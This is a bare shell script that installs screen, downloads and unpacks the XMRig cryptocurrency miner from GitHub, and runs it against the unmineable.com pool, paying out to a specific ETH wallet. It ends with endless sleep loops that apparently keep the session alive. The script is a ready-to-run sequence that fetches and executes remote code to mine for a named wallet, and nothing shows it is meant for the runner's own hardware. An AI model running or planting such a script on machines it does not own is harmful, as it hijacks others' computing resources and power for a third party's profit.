sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-x64.tar.gz
tar xf xmrig-6.16.2-linux-x64.tar.gz
cd xmrig-6.16.2
./xmrig -o rx.unmineable.com:3333 -a rx -k -u ETH:0x76140Bd5BfbffB7Ea6990939875d768692284F80.Clbst_OA#jj7x-ht7f -p x pause
while [ 1 ]; do
sleep 3
done
sleep 999
